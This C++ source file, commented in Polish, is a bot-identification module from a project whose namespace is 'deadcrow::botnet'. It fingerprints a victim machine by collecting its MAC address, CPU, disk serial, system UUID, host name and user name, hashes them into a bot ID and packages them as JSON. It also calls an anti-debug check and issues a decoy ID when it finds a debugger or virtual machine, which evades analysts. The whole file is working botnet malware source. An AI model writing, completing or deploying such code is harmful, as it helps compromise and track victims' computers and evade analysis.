#include "bot_id.h"
#include "../utils/anti_debug.h"
#include <iostream>
#include <sstream>
#include <iomanip>
#include <random>
#include <chrono>
#include <nlohmann/json.hpp>
#include <openssl/sha.h>

#ifdef _WIN32
#include <windows.h>
#include <iphlpapi.h>
#include <intrin.h>
#pragma comment(lib, "iphlpapi.lib")
#else
#include <unistd.h>
#include <sys/utsname.h>
#include <fstream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#endif

using json = nlohmann::json;

namespace deadcrow {
namespace botnet {

BotId::BotId() {
    // Domyślny callback statusu (do konsoli)
    status_callback_ = [](const std::string& status) {
        // W wersji produkcyjnej lepiej wyłączyć logi
        #ifdef _DEBUG
        std::cout << "[BOT_ID] " << status << std::endl;
        #endif
    };
    
    // Generuj ID i zbierz informacje o systemie
    bot_id_ = generateBotId();
    system_info_ = getSystemInfo();
    hardware_fingerprint_ = getHardwareFingerprint();
}

std::string BotId::generateBotId() {
    reportStatus("Generowanie unikalnego ID bota");
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (utils::AntiDebug::performAllChecks()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Generowanie losowego ID.");
        
        // Generuj losowe ID
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 15);
        
        std::stringstream ss;
        ss << "DEBUG_";
        for (int i = 0; i < 16; ++i) {
            ss << std::hex << dis(gen);
        }
        
        return ss.str();
    }
    
    // Zbierz unikalne dane o systemie
    std::string mac = getMacAddress();
    std::string cpu = getCpuInfo();
    std::string disk = getDiskInfo();
    std::string uuid = getSystemUuid();
    
    // Połącz dane
    std::string combined = mac + cpu + disk + uuid;
    
    // Wygeneruj hash
    return generateHash(combined);
}

std::string BotId::getSystemInfo() {
    reportStatus("Pobieranie informacji o systemie");
    
    std::stringstream ss;
    
#ifdef _WIN32
    // Windows
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    
    // Uwaga: GetVersionEx jest przestarzałe, ale nadal działa
    // W produkcji lepiej użyć RtlGetVersion
    GetVersionEx((OSVERSIONINFO*)&osvi);
    
    ss << "Windows ";
    ss << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
    ss << " (Build " << osvi.dwBuildNumber << ")";
    
    // Architektura
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
        ss << " x64";
    } else {
        ss << " x86";
    }
    
    // Nazwa komputera
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameA(computerName, &size)) {
        ss << " | " << computerName;
    }
    
    // Nazwa użytkownika
    char username[257];
    size = sizeof(username) / sizeof(username[0]);
    if (GetUserNameA(username, &size)) {
        ss << " | " << username;
    }
#else
    // Linux
    struct utsname unameData;
    if (uname(&unameData) == 0) {
        ss << unameData.sysname << " " << unameData.release;
        ss << " (" << unameData.machine << ")";
        ss << " | " << unameData.nodename;
    }
    
    // Nazwa użytkownika
    char username[256];
    if (getlogin_r(username, sizeof(username)) == 0) {
        ss << " | " << username;
    }
    
    // Dystrybucja
    std::ifstream os_release("/etc/os-release");
    if (os_release.is_open()) {
        std::string line;
        while (std::getline(os_release, line)) {
            if (line.find("PRETTY_NAME=") == 0) {
                ss << " | " << line.substr(13, line.length() - 14); // Usuń cudzysłowy
                break;
            }
        }
        os_release.close();
    }
#endif
    
    return ss.str();
}

std::string BotId::getHardwareFingerprint() {
    reportStatus("Generowanie fingerprinta sprzętu");
    
    std::stringstream ss;
    
    // MAC
    ss << "MAC: " << getMacAddress() << std::endl;
    
    // CPU
    ss << "CPU: " << getCpuInfo() << std::endl;
    
    // Dysk
    ss << "DISK: " << getDiskInfo() << std::endl;
    
    // UUID
    ss << "UUID: " << getSystemUuid() << std::endl;
    
    return ss.str();
}

std::string BotId::getMacAddress() {
#ifdef _WIN32
    // Windows
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwBufLen = sizeof(adapterInfo);
    
    DWORD dwStatus = GetAdaptersInfo(adapterInfo, &dwBufLen);
    if (dwStatus != ERROR_SUCCESS) {
        return "00:00:00:00:00:00";
    }
    
    PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
    std::stringstream ss;
    
    // Użyj pierwszego adaptera
    if (pAdapterInfo) {
        for (UINT i = 0; i < pAdapterInfo->AddressLength; i++) {
            if (i > 0) ss << ":";
            ss << std::hex << std::setw(2) << std::setfill('0') 
               << static_cast<int>(pAdapterInfo->Address[i]);
        }
    }
    
    return ss.str();
#else
    // Linux
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        return "00:00:00:00:00:00";
    }
    
    struct ifreq ifr;
    struct if_nameindex *if_nidxs, *intf;
    
    if_nidxs = if_nameindex();
    if (if_nidxs != NULL) {
        for (intf = if_nidxs; intf->if_index != 0 || intf->if_name != NULL; intf++) {
            memset(&ifr, 0, sizeof(ifr));
            strncpy(ifr.ifr_name, intf->if_name, IFNAMSIZ - 1);
            
            if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                unsigned char *mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
                
                // Pomiń interfejsy loopback
                if (mac[0] == 0 && mac[1] == 0 && mac[2] == 0 && 
                    mac[3] == 0 && mac[4] == 0 && mac[5] == 0) {
                    continue;
                }
                
                std::stringstream ss;
                for (int i = 0; i < 6; i++) {
                    if (i > 0) ss << ":";
                    ss << std::hex << std::setw(2) << std::setfill('0') 
                       << static_cast<int>(mac[i]);
                }
                
                if_freenameindex(if_nidxs);
                close(sock);
                return ss.str();
            }
        }
        if_freenameindex(if_nidxs);
    }
    
    close(sock);
    return "00:00:00:00:00:00";
#endif
}

std::string BotId::getCpuInfo() {
#ifdef _WIN32
    // Windows
    int cpuInfo[4] = {-1};
    char cpuBrandString[0x40];
    
    __cpuid(cpuInfo, 0x80000000);
    unsigned int nExIds = cpuInfo[0];
    
    memset(cpuBrandString, 0, sizeof(cpuBrandString));
    
    for (unsigned int i = 0x80000000; i <= nExIds; ++i) {
        __cpuid(cpuInfo, i);
        
        if (i == 0x80000002) {
            memcpy(cpuBrandString, cpuInfo, sizeof(cpuInfo));
        } else if (i == 0x80000003) {
            memcpy(cpuBrandString + 16, cpuInfo, sizeof(cpuInfo));
        } else if (i == 0x80000004) {
            memcpy(cpuBrandString + 32, cpuInfo, sizeof(cpuInfo));
        }
    }
    
    return std::string(cpuBrandString);
#else
    // Linux
    std::ifstream cpuinfo("/proc/cpuinfo");
    if (cpuinfo.is_open()) {
        std::string line;
        while (std::getline(cpuinfo, line)) {
            if (line.find("model name") == 0) {
                size_t pos = line.find(":");
                if (pos != std::string::npos) {
                    cpuinfo.close();
                    return line.substr(pos + 2);
                }
            }
        }
        cpuinfo.close();
    }
    
    return "Unknown CPU";
#endif
}

std::string BotId::getDiskInfo() {
#ifdef _WIN32
    // Windows
    char volumeName[MAX_PATH + 1] = {0};
    char fileSystemName[MAX_PATH + 1] = {0};
    DWORD serialNumber = 0;
    DWORD maxComponentLen = 0;
    DWORD fileSystemFlags = 0;
    
    if (GetVolumeInformationA("C:\\", volumeName, sizeof(volumeName),
                             &serialNumber, &maxComponentLen,
                             &fileSystemFlags, fileSystemName, sizeof(fileSystemName))) {
        std::stringstream ss;
        ss << "Volume: " << volumeName << " | Serial: " << std::hex << serialNumber
           << " | FS: " << fileSystemName;
        return ss.str();
    }
    
    return "Unknown Disk";
#else
    // Linux
    std::ifstream mounts("/proc/mounts");
    if (mounts.is_open()) {
        std::string line;
        while (std::getline(mounts, line)) {
            if (line.find(" / ") != std::string::npos) {
                mounts.close();
                return line;
            }
        }
        mounts.close();
    }
    
    return "Unknown Disk";
#endif
}

std::string BotId::getSystemUuid() {
#ifdef _WIN32
    // Windows
    // Użyj WMI do pobrania UUID (w produkcji)
    // Tutaj uproszczona wersja
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameA(computerName, &size)) {
        return std::string(computerName) + "-UUID";
    }
    
    return "Unknown-UUID";
#else
    // Linux
    std::ifstream dmidecode("/sys/class/dmi/id/product_uuid");
    if (dmidecode.is_open()) {
        std::string uuid;
        std::getline(dmidecode, uuid);
        dmidecode.close();
        return uuid;
    }
    
    return "Unknown-UUID";
#endif
}

std::string BotId::generateHash(const std::string& data) {
    // Użyj SHA-256 do wygenerowania hasha
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, data.c_str(), data.length());
    SHA256_Final(hash, &sha256);
    
    std::stringstream ss;
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(hash[i]);
    }
    
    return ss.str();
}

std::string BotId::toJson() const {
    json j;
    j["bot_id"] = bot_id_;
    j["system_info"] = system_info_;
    j["hardware_fingerprint"] = hardware_fingerprint_;
    j["timestamp"] = std::chrono::system_clock::now().time_since_epoch().count();
    
    return j.dump(4); // Pretty print z wcięciem 4 spacje
}

void BotId::setStatusCallback(std::function<void(const std::string&)> callback) {
    status_callback_ = callback;
}

void BotId::reportStatus(const std::string& status) {
    if (status_callback_) {
        status_callback_(status);
    }
}

} // namespace botnet
} // namespace deadcrow
